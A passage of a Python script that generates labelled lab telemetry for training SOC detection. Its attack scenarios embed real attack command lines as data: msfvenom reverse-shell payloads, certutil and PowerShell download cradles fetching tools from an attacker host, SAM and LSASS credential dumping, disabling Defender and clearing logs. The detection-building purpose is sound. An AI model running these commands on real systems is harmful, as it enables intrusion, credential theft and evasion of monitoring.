"""
SOCFusion Training Dataset Generator
Generates realistic Sysmon + Windows Security + Linux auditd telemetry
covering Metasploit reverse shell, keylogger, and all other attack scenarios.
"""

import csv
import random
import math
from datetime import datetime, timedelta

random.seed(42)

# ============================================================
# LAB ENVIRONMENT
# ============================================================

HOSTS = {
    "SOC-DC":       "192.168.56.10",
    "SOC-CLIENT01": "192.168.56.20",
    "SOC-CLIENT02": "192.168.56.30",
    "soc-kali":     "192.168.56.40",
}

DOMAIN = "SOCFUSION.LOCAL"

USERS = {
    "SOC-DC":       ["Administrator", "SYSTEM", "svc_sql", "krbtgt"],
    "SOC-CLIENT01": ["Administrator", "vikas", "SYSTEM", "NETWORK SERVICE"],
    "SOC-CLIENT02": ["Administrator", "user2", "SYSTEM"],
    "soc-kali":     ["root", "kali"],
}

NORMAL_PROCESSES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\lsass.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\System32\\wininit.exe",
    "C:\\Windows\\System32\\csrss.exe",
    "C:\\Windows\\System32\\winlogon.exe",
    "C:\\Windows\\System32\\taskhostw.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\System32\\RuntimeBroker.exe",
    "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "C:\\Windows\\System32\\SearchIndexer.exe",
    "C:\\Windows\\System32\\spoolsv.exe",
    "C:\\Windows\\System32\\WmiPrvSE.exe",
    "C:\\Windows\\System32\\dllhost.exe",
    "C:\\Windows\\System32\\taskeng.exe",
    "C:\\Windows\\System32\\msiexec.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\notepad.exe",
    "C:\\Windows\\System32\\calc.exe",
]

NORMAL_NETPORTS = [80, 443, 135, 445, 139, 53, 88, 389, 636, 3389]

# ============================================================
# CSV COLUMNS
# ============================================================

COLUMNS = [
    "timestamp", "host_normalized", "source_normalized",
    "event_code", "event_type", "event_category",
    "account_target", "account_domain",
    "process_normalized", "parent_process", "command_line_normalized",
    "source_ip", "source_port", "destination_ip", "destination_port",
    "attack_stage", "attack_label", "attack_id",
    "mitre_tactic", "mitre_technique", "mitre_subtechnique",
    "confidence", "correlation_key", "telemetry_source",
    "raw_event_summary"
]

rows = []

# ============================================================
# HELPER FUNCTIONS
# ============================================================

BASE_TIME = datetime(2026, 8, 17, 14, 0, 0)

def ts(offset_seconds):
    return (BASE_TIME + timedelta(seconds=offset_seconds)).strftime("%Y-%m-%dT%H:%M:%S.000+0530")

def make_row(
    offset, host, source, event_code, event_type, event_category,
    account, domain, process, parent, cmdline,
    src_ip, src_port, dst_ip, dst_port,
    stage, label, attack_id, tactic, technique, subtechnique, confidence,
    corr_key, tel_source, raw_summary
):
    return {
        "timestamp": ts(offset),
        "host_normalized": host,
        "source_normalized": source,
        "event_code": event_code,
        "event_type": event_type,
        "event_category": event_category,
        "account_target": account,
        "account_domain": domain,
        "process_normalized": process,
        "parent_process": parent,
        "command_line_normalized": cmdline,
        "source_ip": src_ip,
        "source_port": src_port,
        "destination_ip": dst_ip,
        "destination_port": dst_port,
        "attack_stage": stage,
        "attack_label": label,
        "attack_id": attack_id,
        "mitre_tactic": tactic,
        "mitre_technique": technique,
        "mitre_subtechnique": subtechnique,
        "confidence": confidence,
        "correlation_key": corr_key,
        "telemetry_source": tel_source,
        "raw_event_summary": raw_summary,
    }

def benign_row(offset, host, process, parent, cmdline="", port=None):
    user = random.choice(USERS[host])
    dst_port = port or random.choice(NORMAL_NETPORTS)
    dst_ip = random.choice(list(HOSTS.values()))
    return make_row(
        offset, host, "windows_sysmon", "1", "process_creation", "process_execution",
        user, DOMAIN, process, parent, cmdline,
        HOSTS[host], str(random.randint(49152, 65535)), dst_ip, str(dst_port),
        "normal_operation", 0, "BASELINE", "", "", "", 1.0,
        f"BASELINE|{host}|{user}", "Sysmon EventID 1",
        f"Process created: {process.split(chr(92))[-1]}"
    )

# ============================================================
# SCENARIO A: BASELINE (BENIGN ACTIVITY)
# ~2000 events spanning 8 hours
# ============================================================

print("Generating BASELINE benign activity...")
t = 0
for _ in range(2000):
    host = random.choice(list(HOSTS.keys()))
    if host == "soc-kali":
        host = "SOC-CLIENT01"
    proc = random.choice(NORMAL_PROCESSES)
    parent = random.choice(NORMAL_PROCESSES)
    rows.append(benign_row(t, host, proc, parent))
    t += random.randint(5, 120)

# ============================================================
# SCENARIO B: METASPLOIT REVERSE SHELL ATTACK
# Kali → SOC-CLIENT01 via meterpreter TCP 4444
# ============================================================

print("Generating METASPLOIT Reverse Shell telemetry...")
t = 10000   # fresh time window

# B1: Attacker generates payload on Kali
rows.append(make_row(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "msfvenom", "/bin/bash",
    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.40 LPORT=4444 -f exe -o payload.exe",
    "192.168.56.40", "", "", "",
    "payload_generation", 1, "ATTACK_METASPLOIT",
    "Execution", "T1588", "T1588.002", 0.95,
    "ATTACK_METASPLOIT|root|soc-kali", "Kali auditd",
    "msfvenom payload generation: reverse_tcp LHOST=192.168.56.40 LPORT=4444"
))
t += 8

# B2: msfconsole starts listener
rows.append(make_row(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "msfconsole", "/bin/bash",
    "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.40; set LPORT 4444; run'",
    "192.168.56.40", "", "", "",
    "handler_setup", 1, "ATTACK_METASPLOIT",
    "Execution", "T1059", "T1059.004", 0.97,
    "ATTACK_METASPLOIT|root|soc-kali", "Kali auditd",
    "msfconsole handler started: PAYLOAD=windows/meterpreter/reverse_tcp PORT=4444"
))
t += 3

# B3: Payload delivered to victim (file created on CLIENT01)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "11", "file_creation", "file_activity",
    "Administrator", DOMAIN,
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe", "explorer.exe",
    "",
    "", "", "", "",
    "payload_delivery", 1, "ATTACK_METASPLOIT",
    "Initial Access", "T1105", "", 0.96,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 11",
    "FileCreate: payload.exe dropped in AppData\\Local\\Temp"
))
t += 2

# B4: Victim executes payload (EventID 1)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
    "192.168.56.20", "", "", "",
    "payload_execution", 1, "ATTACK_METASPLOIT",
    "Execution", "T1204", "T1204.002", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "Process created: payload.exe by Administrator under explorer.exe"
))
t += 1

# B5: Reverse TCP connection established (EventID 3)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "3", "network_connection", "network_activity",
    "Administrator", DOMAIN,
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
    "", "",
    "192.168.56.20", str(random.randint(49152, 65535)), "192.168.56.40", "4444",
    "c2_connection", 1, "ATTACK_METASPLOIT",
    "Command and Control", "T1071", "T1071.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 3",
    "Network connect: SOC-CLIENT01:ephemeral → soc-kali:4444 (reverse TCP shell)"
))
t += 1

# B6: Meterpreter injects into process (EventID 8 - CreateRemoteThread)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "8", "create_remote_thread", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe", "",
    "192.168.56.20", "", "", "",
    "process_injection", 1, "ATTACK_METASPLOIT",
    "Defense Evasion", "T1055", "T1055.001", 0.97,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 8",
    "CreateRemoteThread: payload.exe → svchost.exe (meterpreter injection)"
))
t += 2

# B7: cmd.exe spawned under meterpreter session
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
    "cmd.exe",
    "192.168.56.20", "", "", "",
    "shell_execution", 1, "ATTACK_METASPLOIT",
    "Execution", "T1059", "T1059.003", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "Process created: cmd.exe spawned by payload.exe (meterpreter shell)"
))
t += 3

# B8: System info gathering (sysinfo equivalent)
for cmd, technique, sub, stage in [
    ("whoami /all", "T1033", "", "discovery"),
    ("net user", "T1087", "T1087.001", "discovery"),
    ("net localgroup administrators", "T1069", "T1069.001", "discovery"),
    ("ipconfig /all", "T1016", "", "discovery"),
    ("netstat -ano", "T1049", "", "discovery"),
    ("route print", "T1016", "", "discovery"),
    ("arp -a", "T1018", "", "discovery"),
    ("systeminfo", "T1082", "", "discovery"),
    ("tasklist /v", "T1057", "", "discovery"),
    ("net view", "T1135", "", "discovery"),
]:
    rows.append(make_row(
        t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
        "Administrator", DOMAIN,
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
        cmd,
        "192.168.56.20", "", "", "",
        stage, 1, "ATTACK_METASPLOIT",
        "Discovery", technique, sub, 0.95,
        f"ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
        f"Discovery command via meterpreter shell: {cmd}"
    ))
    t += random.randint(2, 8)

# B9: Ingress tool transfer (download additional tool)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\certutil.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "certutil -urlcache -split -f http://192.168.56.40/tools/mimikatz.exe C:\\Windows\\Temp\\svc.exe",
    "192.168.56.20", "", "192.168.56.40", "80",
    "tool_transfer", 1, "ATTACK_METASPLOIT",
    "Command and Control", "T1105", "", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "certutil tool download: http://192.168.56.40/tools/mimikatz.exe → C:\\Windows\\Temp\\svc.exe"
))
t += 5

# B10: Network connection for tool download
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "3", "network_connection", "network_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\certutil.exe", "", "",
    "192.168.56.20", str(random.randint(49152, 65535)), "192.168.56.40", "80",
    "tool_transfer", 1, "ATTACK_METASPLOIT",
    "Command and Control", "T1105", "", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 3",
    "Network connect: certutil → 192.168.56.40:80 (tool download)"
))
t += 2

# ============================================================
# SCENARIO C: KEYLOGGER (keyscan_start + keyscan_dump)
# Executed within the Meterpreter session
# ============================================================

print("Generating KEYLOGGER telemetry...")
t += 10  # slight gap

# C1: keyscan_start injected
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "8", "create_remote_thread", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe", "",
    "192.168.56.20", "", "", "",
    "keylogger_inject", 1, "ATTACK_METASPLOIT",
    "Collection", "T1056", "T1056.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 8",
    "keyscan_start: keylogger hook injected into svchost.exe via meterpreter"
))
t += 2

# C2: keyscan_start registry hook (EventID 12 - registry)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "12", "registry_event", "registry_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\svchost.exe", "", "",
    "192.168.56.20", "", "", "",
    "keylogger_hook", 1, "ATTACK_METASPLOIT",
    "Collection", "T1056", "T1056.001", 0.97,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 12",
    "RegistryEvent: keyboard hook registered by svchost.exe (keyscan active)"
))
t += 3

# C3: User types credentials (simulated — benign-looking events before dump)
for _ in range(5):
    rows.append(benign_row(t, "SOC-CLIENT01",
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\System32\\services.exe"))
    t += random.randint(10, 30)

# C4: keyscan_dump — data exfiltrated back over meterpreter
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "3", "network_connection", "network_activity",
    "Administrator", DOMAIN,
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe", "", "",
    "192.168.56.20", str(random.randint(49152, 65535)), "192.168.56.40", "4444",
    "keylogger_exfil", 1, "ATTACK_METASPLOIT",
    "Exfiltration", "T1056", "T1056.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 3",
    "keyscan_dump: keystroke data sent back to meterpreter C2 on port 4444"
))
t += 2

# C5: keyscan_dump file write (keys to temp file first)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "11", "file_creation", "file_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\svchost.exe", "", "",
    "192.168.56.20", "", "", "",
    "keylogger_exfil", 1, "ATTACK_METASPLOIT",
    "Collection", "T1056", "T1056.001", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 11",
    "FileCreate: keylog output written to C:\\Windows\\Temp\\kl.dat"
))
t += 3

# ============================================================
# SCENARIO D: CREDENTIAL DUMPING
# ============================================================

print("Generating CREDENTIAL DUMPING telemetry...")
t += 30

# D1: reg save SAM
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\reg.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y",
    "192.168.56.20", "", "", "",
    "credential_dump", 1, "ATTACK_METASPLOIT",
    "Credential Access", "T1003", "T1003.002", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "reg save HKLM\\SAM → C:\\Windows\\Temp\\sam.save (SAM database dump)"
))
t += 2

# D2: reg save SYSTEM hive
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\reg.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y",
    "192.168.56.20", "", "", "",
    "credential_dump", 1, "ATTACK_METASPLOIT",
    "Credential Access", "T1003", "T1003.002", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "reg save HKLM\\SYSTEM → C:\\Windows\\Temp\\system.save (SYSTEM hive dump)"
))
t += 2

# D3: mimikatz sekurlsa::logonpasswords equivalent
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "10", "process_access", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\Temp\\svc.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\Temp\\svc.exe privilege::debug sekurlsa::logonpasswords",
    "192.168.56.20", "", "", "",
    "lsass_dump", 1, "ATTACK_METASPLOIT",
    "Credential Access", "T1003", "T1003.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 10",
    "ProcessAccess: svc.exe opened LSASS (mimikatz sekurlsa::logonpasswords)"
))
t += 1

# D4: lsass.exe memory access
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "10", "process_access", "process_execution",
    "SYSTEM", DOMAIN,
    "C:\\Windows\\System32\\lsass.exe",
    "C:\\Windows\\Temp\\svc.exe", "",
    "192.168.56.20", "", "", "",
    "lsass_dump", 1, "ATTACK_METASPLOIT",
    "Credential Access", "T1003", "T1003.001", 0.99,
    "ATTACK_METASPLOIT|SYSTEM|SOC-CLIENT01", "Sysmon EventID 10",
    "LSASS memory read: svc.exe accessed lsass.exe process memory (credential dump)"
))
t += 3

# D5: dump file created
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "11", "file_creation", "file_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\Temp\\svc.exe", "", "",
    "192.168.56.20", "", "", "",
    "lsass_dump", 1, "ATTACK_METASPLOIT",
    "Credential Access", "T1003", "T1003.001", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 11",
    "FileCreate: lsass.dmp written to C:\\Windows\\Temp\\ by svc.exe"
))
t += 2

# ============================================================
# SCENARIO E: PERSISTENCE (Scheduled Task + Registry RunKey)
# ============================================================

print("Generating PERSISTENCE telemetry...")
t += 20

# E1: schtasks create
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\schtasks.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "schtasks /create /tn \"Windows Update Helper\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc ONLOGON /ru SYSTEM /f",
    "192.168.56.20", "", "", "",
    "persistence_schtask", 1, "ATTACK_METASPLOIT",
    "Persistence", "T1053", "T1053.005", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "schtasks /create: Windows Update Helper → payload.exe ONLOGON SYSTEM"
))
t += 2

# E2: Registry RunKey persistence
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "13", "registry_value_set", "registry_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\reg.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateSvc /t REG_SZ /d C:\\Windows\\Temp\\payload.exe /f",
    "192.168.56.20", "", "", "",
    "persistence_regkey", 1, "ATTACK_METASPLOIT",
    "Persistence", "T1547", "T1547.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 13",
    "RegSetValue: HKCU\\Run\\WindowsUpdateSvc = payload.exe (run key persistence)"
))
t += 2

# E3: WMI subscription for persistence
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "19", "wmi_event", "wmi_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "WmiEventConsumer created: payload.exe on ProcessStart",
    "192.168.56.20", "", "", "",
    "persistence_wmi", 1, "ATTACK_METASPLOIT",
    "Persistence", "T1546", "T1546.003", 0.96,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 19",
    "WMIEventConsumer: __EventFilter created binding payload.exe to process start"
))
t += 3

# ============================================================
# SCENARIO F: LATERAL MOVEMENT TO SOC-CLIENT02
# ============================================================

print("Generating LATERAL MOVEMENT telemetry...")
t += 30

# F1: PsExec-style lateral movement
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
    "cmd.exe /c net use \\\\192.168.56.30\\IPC$ /user:Administrator Attack001@123",
    "192.168.56.20", "", "192.168.56.30", "445",
    "lateral_movement_prep", 1, "ATTACK_METASPLOIT",
    "Lateral Movement", "T1021", "T1021.002", 0.97,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "net use IPC$ to SOC-CLIENT02 with credentials (lateral movement prep)"
))
t += 3

# F2: SMB connection
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "3", "network_connection", "network_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\cmd.exe", "", "",
    "192.168.56.20", str(random.randint(49152, 65535)), "192.168.56.30", "445",
    "lateral_movement_smb", 1, "ATTACK_METASPLOIT",
    "Lateral Movement", "T1021", "T1021.002", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 3",
    "Network: SOC-CLIENT01 → SOC-CLIENT02:445 (SMB lateral movement)"
))
t += 2

# F3: Windows Security logon event on CLIENT02 (EventID 4624)
rows.append(make_row(
    t, "SOC-CLIENT02", "windows_security", "4624", "logon", "authentication",
    "Administrator", DOMAIN,
    "", "", "",
    "192.168.56.20", "", "192.168.56.30", "",
    "lateral_movement_logon", 1, "ATTACK_METASPLOIT",
    "Lateral Movement", "T1021", "T1021.002", 0.97,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT02", "Windows Security EventID 4624",
    "Logon: Administrator from 192.168.56.20 (SOC-CLIENT01) LogonType=3 (Network)"
))
t += 1

# F4: Payload copy to CLIENT02
rows.append(make_row(
    t, "SOC-CLIENT02", "windows_sysmon", "11", "file_creation", "file_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\services.exe", "",
    "",
    "192.168.56.30", "", "", "",
    "lateral_movement_payload", 1, "ATTACK_METASPLOIT",
    "Lateral Movement", "T1021", "T1021.002", 0.96,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT02", "Sysmon EventID 11",
    "FileCreate: payload2.exe copied to C:\\Windows\\Temp\\ on SOC-CLIENT02"
))
t += 2

# F5: payload execution on CLIENT02
rows.append(make_row(
    t, "SOC-CLIENT02", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\Temp\\payload2.exe",
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\Temp\\payload2.exe",
    "192.168.56.30", "", "", "",
    "lateral_movement_exec", 1, "ATTACK_METASPLOIT",
    "Execution", "T1204", "T1204.002", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT02", "Sysmon EventID 1",
    "Payload executed on SOC-CLIENT02 by Administrator"
))
t += 1

# F6: Reverse TCP from CLIENT02
rows.append(make_row(
    t, "SOC-CLIENT02", "windows_sysmon", "3", "network_connection", "network_activity",
    "Administrator", DOMAIN,
    "C:\\Windows\\Temp\\payload2.exe", "", "",
    "192.168.56.30", str(random.randint(49152, 65535)), "192.168.56.40", "4444",
    "c2_connection", 1, "ATTACK_METASPLOIT",
    "Command and Control", "T1071", "T1071.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT02", "Sysmon EventID 3",
    "Reverse TCP: SOC-CLIENT02 → soc-kali:4444 (second meterpreter session)"
))
t += 5

# ============================================================
# SCENARIO G: PRIVILEGE ESCALATION (via token impersonation)
# ============================================================

print("Generating PRIVILEGE ESCALATION telemetry...")
t += 15

# G1: getsystem attempt (token impersonation)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "SYSTEM", DOMAIN,
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp\\payload.exe",
    "cmd.exe",
    "192.168.56.20", "", "", "",
    "privesc_getsystem", 1, "ATTACK_METASPLOIT",
    "Privilege Escalation", "T1134", "T1134.001", 0.98,
    "ATTACK_METASPLOIT|SYSTEM|SOC-CLIENT01", "Sysmon EventID 1",
    "getsystem: cmd.exe spawned under SYSTEM via token impersonation (meterpreter)"
))
t += 2

# G2: UAC bypass
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\eventvwr.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "eventvwr.exe",
    "192.168.56.20", "", "", "",
    "privesc_uac_bypass", 1, "ATTACK_METASPLOIT",
    "Privilege Escalation", "T1548", "T1548.002", 0.95,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "UAC bypass: eventvwr.exe hijack for high-integrity process execution"
))
t += 2

# G3: High-integrity shell spawned
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "SYSTEM", DOMAIN,
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\eventvwr.exe",
    "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.40/stage2.ps1')",
    "192.168.56.20", "", "192.168.56.40", "80",
    "privesc_shell", 1, "ATTACK_METASPLOIT",
    "Privilege Escalation", "T1059", "T1059.001", 0.99,
    "ATTACK_METASPLOIT|SYSTEM|SOC-CLIENT01", "Sysmon EventID 1",
    "High-integrity PowerShell download cradle: IEX DownloadString from C2"
))
t += 3

# ============================================================
# SCENARIO H: DEFENSE EVASION
# ============================================================

print("Generating DEFENSE EVASION telemetry...")
t += 10

# H1: Windows Defender disabled
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
    "192.168.56.20", "", "", "",
    "defense_evasion_av", 1, "ATTACK_METASPLOIT",
    "Defense Evasion", "T1562", "T1562.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true (Defender disabled)"
))
t += 2

# H2: Audit log clearing
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\wevtutil.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "wevtutil cl Security",
    "192.168.56.20", "", "", "",
    "defense_evasion_logs", 1, "ATTACK_METASPLOIT",
    "Defense Evasion", "T1070", "T1070.001", 0.99,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "wevtutil cl Security: Security event log cleared"
))
t += 1

# H3: Security EventID 1102 (log cleared)
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_security", "1102", "log_cleared", "audit",
    "Administrator", DOMAIN,
    "", "", "",
    "192.168.56.20", "", "", "",
    "defense_evasion_logs", 1, "ATTACK_METASPLOIT",
    "Defense Evasion", "T1070", "T1070.001", 1.0,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Windows Security EventID 1102",
    "EventID 1102: Audit log was cleared by Administrator"
))
t += 2

# H4: Obfuscated PowerShell
rows.append(make_row(
    t, "SOC-CLIENT01", "windows_sysmon", "1", "process_creation", "process_execution",
    "Administrator", DOMAIN,
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBz",
    "192.168.56.20", "", "", "",
    "defense_evasion_obfus", 1, "ATTACK_METASPLOIT",
    "Defense Evasion", "T1027", "", 0.98,
    "ATTACK_METASPLOIT|Administrator|SOC-CLIENT01", "Sysmon EventID 1",
    "Obfuscated PowerShell: -Enc base64 payload (T1027 Obfuscation)"
))
t += 3

# ============================================================
# SCENARIO I: RECONNAISSANCE (nmap)
# ============================================================

print("Generating RECONNAISSANCE telemetry...")
t += 50

rows.append(make_row(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "/usr/lib/nmap/nmap", "/bin/bash",
    "nmap -sV -O -p 1-65535 192.168.56.0/24",
    "192.168.56.40", "", "192.168.56.0/24", "",
    "reconnaissance", 1, "ATTACK_RECON",
    "Reconnaissance", "T1046", "", 0.99,
    "ATTACK_RECON|root|soc-kali", "Kali auditd",
    "nmap full port scan with service/OS detection on lab subnet"
))
t += 30

# Multiple scan targets
for target_ip in ["192.168.56.10", "192.168.56.20", "192.168.56.30"]:
    rows.append(make_row(
        t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
        "root", "", "/usr/lib/nmap/nmap", "/bin/bash",
        f"nmap -Pn -p 22,80,135,139,443,445,3389,8080 {target_ip}",
        "192.168.56.40", "", target_ip, "",
        "reconnaissance", 1, "ATTACK_RECON",
        "Reconnaissance", "T1046", "", 0.97,
        f"ATTACK_RECON|root|soc-kali", "Kali auditd",
        f"nmap targeted scan: {target_ip}"
    ))
    t += 15

# ============================================================
# SCENARIO J: KERBEROASTING
# ============================================================

print("Generating KERBEROASTING telemetry...")
t += 100

rows.append(make_row(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "python3", "/bin/bash",
    "python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py socfusion.local/svc_sql:Attack003@123 -dc-ip 192.168.56.10 -request",
    "192.168.56.40", "", "192.168.56.10", "88",
    "kerberoasting_exec", 1, "ATTACK_KERB",
    "Credential Access", "T1558", "T1558.003", 0.99,
    "ATTACK_KERB|root|soc-kali", "Kali auditd",
